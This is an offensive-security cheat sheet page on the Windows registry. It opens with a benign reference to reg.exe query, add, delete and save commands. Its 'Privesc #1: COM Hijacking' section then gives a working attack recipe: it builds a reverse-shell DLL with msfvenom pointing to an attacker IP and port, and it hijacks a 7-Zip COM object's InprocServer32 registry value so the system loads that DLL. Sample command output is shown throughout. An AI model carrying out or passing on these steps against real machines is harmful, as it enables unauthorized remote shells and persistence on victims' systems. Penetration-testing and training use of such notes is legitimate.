---
title: "Registry"
date: 2025-7-24
tags: ["Windows", "Registry", "reg.exe", "Windows Internals", "Persistence", "COM Hijacking", "DLL Injection"]
---

### General

#### Key Hives

```console
HKEY_LOCAL_MACHINE (HKLM)     System-wide settings (SAM, SYSTEM, SOFTWARE, SECURITY)
HKEY_CURRENT_USER (HKCU)      Current user settings
HKEY_USERS (HKU)              All loaded user profiles
HKEY_CLASSES_ROOT (HKCR)      File associations, COM objects
HKEY_CURRENT_CONFIG (HKCC)    Current hardware config
```

#### Query Key

```console
# Displays all keys, subkeys, and values recursively
reg query <PATH> /s
```

```console {class="sample-code"}
# Display all keys, subkeys, and values under CLSID recursively
reg query HKCR\CLSID /s
```

```console
# Display all keys, subkeys, and values containing KEYWORD recursively
reg query <PATH> /s /f "<KEYWORD>"
```

```console {class="sample-code"}
# Display all keys, subkeys, and values containing KEYWORD under HKLM recursively
reg query HKLM /s /f "<KEYWORD>"
```

#### Add Key

```console
reg add <PATH>
```

#### Add Value

```console
reg add <PATH> /v <VALUE_NAME> /t <TYPE> /d <DATA> /f
```

```console {class="sample-code"}
reg add HKLM\SOFTWARE\MyNewKey /v MySetting /t REG_SZ /d "TestValue" /f
```

<br>

```console
REG_SZ          Text string
REG_EXPAND_SZ   String with environment variables
REG_DWORD       32-bit integer
REG_QWORD       64-bit integer
REG_BINARY      Binary data
REG_MULTI_SZ    Multiple strings
REG_NONE        Undefined data
```

#### Delete Key

```console
reg delete <PATH> /f
```

#### Export Hive

```console
reg save <HIVE> <DEST_PATH>
```

### Privesc #1: COM Hijacking

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Registry Enum

```console
# Query all CLSID entries recursively
reg query HKCR\CLSID /s
```

```console
# Query CLSID entries containing KEYWORD recursively
reg query HKCR\CLSID /s /f "<KEYWORD>"
```

```console {class="sample-code"}
PS C:\Windows\system32> reg query HKCR\CLSID /s /f "zip"
reg query HKCR\CLSID /s /f "zip"

HKEY_CLASSES_ROOT\CLSID\{2317---[SNIP]---20000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_CLASSES_ROOT\CLSID\{2317---[SNIP]---20000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll

---[SNIP]---
```

#### 2. Create a Malicious DLL

```console
msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.dll
```

```console {class="sample-code"}
$ msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.10.10 LPORT=1337 > rev.dll
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
```

#### 2. Replace Default Value

```console
reg add "HKLM\Software\Classes\CLSID\<CLSID>\InprocServer32" /ve /d "<CUSTOM_DLL>" /f
```

```console {class="sample-code"}
PS C:\Windows\system32> reg add "HKLM\Software\Classes\CLSID\{2317---[SNIP]---20000}\InprocServer32" /ve /d "C:\programdata\rev.dll" /f
reg add "HKLM\Software\Classes\CLSID\{2317---[SNIP]---20000}\InprocServer32" /ve /d "C:\programdata\rev.dll" /f
The operation completed successfully.
```

{{< /tabcontent >}}
